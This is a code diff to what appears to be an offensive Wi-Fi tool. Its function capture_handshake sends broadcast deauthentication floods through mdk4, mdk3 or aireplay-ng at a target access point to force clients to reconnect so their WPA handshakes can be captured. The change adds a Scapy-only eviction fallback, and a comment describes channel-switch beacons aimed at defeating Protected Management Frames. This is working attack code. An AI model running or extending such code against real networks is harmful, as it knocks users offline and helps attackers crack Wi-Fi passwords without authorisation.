@@ -121,9 +121,13 @@ def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown", inj
 
     deauth_tool = _find_deauth_tool()
     if not deauth_tool:
-        logger.error("No deauth tool found (mdk4/mdk3/aireplay-ng)")
-        print(f"{C_RED}[!] No deauth tool found. Install mdk4: sudo apt install mdk4{C_RESET}")
-        return None
+        if HAS_EVICTION:
+            logger.warning("No external deauth tool found — falling back to Scapy-only eviction")
+            print(f"{C_YELLOW}[!] mdk4/aireplay-ng not found — using Scapy eviction only (install mdk4 for better results){C_RESET}")
+        else:
+            logger.error("No deauth tool and no Scapy eviction available")
+            print(f"{C_RED}[!] No deauth tool found. Install mdk4: sudo apt install mdk4{C_RESET}")
+            return None
 
     tmpdir = tempfile.mkdtemp(prefix="wfn_")
     cap_prefix = os.path.join(tmpdir, "cap")
@@ -201,23 +205,24 @@ def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown", inj
                     except Exception as e:
                         logger.debug(f"Targeted aireplay failed for {client_mac}: {e}")
 
-            # 2. Broadcast Deauth via mdk4 or aireplay-ng
-            if deauth_tool in ("mdk4", "mdk3"):
-                bcast_cmd = [deauth_tool, inj_iface, "d", "-b", bl_file, "-c", str(channel)]
-            else:
-                bcast_cmd = ["aireplay-ng", "-0", "15", "-a", bssid,
-                             "--ignore-negative-one", inj_iface]
+            # 2. Broadcast Deauth via mdk4 or aireplay-ng (only if available)
+            if deauth_tool:
+                if deauth_tool in ("mdk4", "mdk3"):
+                    bcast_cmd = [deauth_tool, inj_iface, "d", "-b", bl_file, "-c", str(channel)]
+                else:
+                    bcast_cmd = ["aireplay-ng", "-0", "15", "-a", bssid,
+                                 "--ignore-negative-one", inj_iface]
 
-            try:
-                p_bcast = subprocess.Popen(
-                    bcast_cmd,
-                    stdout=subprocess.DEVNULL,
-                    stderr=open(deauth_err_file, "wb"),
-                    preexec_fn=os.setsid if os.name != "nt" else None
-                )
-                deauth_procs.append(p_bcast)
-            except Exception as e:
-                logger.debug(f"Broadcast deauth failed: {e}")
+                try:
+                    p_bcast = subprocess.Popen(
+                        bcast_cmd,
+                        stdout=subprocess.DEVNULL,
+                        stderr=open(deauth_err_file, "wb"),
+                        preexec_fn=os.setsid if os.name != "nt" else None
+                    )
+                    deauth_procs.append(p_bcast)
+                except Exception as e:
+                    logger.debug(f"Broadcast deauth failed: {e}")
 
             # 3. Inject multi-vector Scapy frames (Bidirectional deauth + CSA beacon for PMF)
             if eviction_engine:
